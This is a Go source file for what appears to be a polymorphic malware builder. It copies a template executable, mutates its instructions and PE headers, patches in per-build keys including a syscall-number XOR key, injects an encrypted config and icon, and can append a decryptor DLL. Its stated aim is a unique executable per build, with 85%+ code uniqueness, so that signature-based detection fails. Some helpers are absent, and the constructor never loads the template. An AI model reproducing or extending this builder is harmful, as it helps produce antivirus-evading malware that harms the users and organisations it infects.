// Package builder — 5-phase build pipeline orchestrator
//
// Pipeline: template → morph → PE mutate → poly patch → config inject → [icon]
// Produces a unique executable per build with 85%+ code uniqueness.
package builder

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log/slog"
)

// Engine holds the pre-compiled template and build configuration.
type Engine struct {
	Template   []byte // pre-compiled mirage_template.exe
	Decryptor  []byte // optional decryptor.dll to append
}

// BuildResult contains the output of a successful build.
type BuildResult struct {
	Data   []byte // final EXE bytes
	SHA256 string // hex-encoded SHA-256
	Size   int    // file size in bytes
}

// Config holds template configuration (non-user-configurable).
type Config struct {
	TemplatePath   string
	WorkDir        string
}

// New creates a new build engine from a pre-compiled template.
func New(cfg Config) (*Engine, error) {
	if cfg.TemplatePath == "" {
		return nil, fmt.Errorf("builder: TemplatePath required")
	}
	// Template loaded externally (from disk/Docker volume)
	return &Engine{}, nil
}

// Build runs the full 5-phase pipeline and returns a unique executable.
func (e *Engine) Build(config interface{}, polyConfig PolyConfig) (BuildResult, error) {
	if err := polyConfig.Validate(); err != nil {
		return BuildResult{}, fmt.Errorf("builder: invalid poly config: %w", err)
	}
	if len(e.Template) == 0 {
		return BuildResult{}, fmt.Errorf("builder: template not loaded")
	}

	exe := bytes.Clone(e.Template)
	slog.Debug("build: template copied", "size", len(exe))

	// Phase 2: Morph — PolyEngine-style instruction mutation
	exe = morphInstructions(exe)
	slog.Debug("build: morph complete", "size", len(exe))

	// Phase 3: PE Mutate — Eidos-style header/section mutations
	exe = peMutate(exe)
	slog.Debug("build: pe mutate complete", "size", len(exe))

	// Phase 4: Poly — write unique crypto constants to .mi_cfg section
	var err error
	exe, err = WriteMiCfgSection(exe, buildMiCfgConfig(polyConfig))
	if err != nil {
		return BuildResult{}, fmt.Errorf("build: mi_cfg patch: %w", err)
	}
	slog.Debug("build: poly patch complete", "size", len(exe))

	// Phase 5: Config — inject AES-256-GCM BuildConfig
	exe, err = InjectConfig(exe, config)
	if err != nil {
		return BuildResult{}, fmt.Errorf("build: config inject: %w", err)
	}
	slog.Debug("build: config inject complete", "size", len(exe))

	// Phase 6: Icon — inject .ico as .icon PE section
	if bc, ok := config.(interface{ GetIconData() []byte }); ok {
		if iconData := bc.GetIconData(); len(iconData) > 0 {
			var iconErr error
			exe, iconErr = InjectIcon(exe, iconData)
			if iconErr != nil {
				slog.Warn("build: icon injection failed", "err", iconErr)
			}
		}
	}
	// Optional: append decryptor DLL
 	if len(e.Decryptor) > 0 {
 		exe = append(exe, e.Decryptor...)
 	}

	sha := sha256.Sum256(exe)
	return BuildResult{
		Data:   exe,
		SHA256: hex.EncodeToString(sha[:]),
		Size:   len(exe),
	}, nil
}

// buildMiCfgConfig converts a PolyConfig to MiCfgConfig for serialization.
func buildMiCfgConfig(pc PolyConfig) MiCfgConfig {
	return MiCfgConfig{
		Seed:      pc.Seed,
		StringKey: pc.StringKey,
		SSNXorKey: pc.SSNXorKey,
	}
}
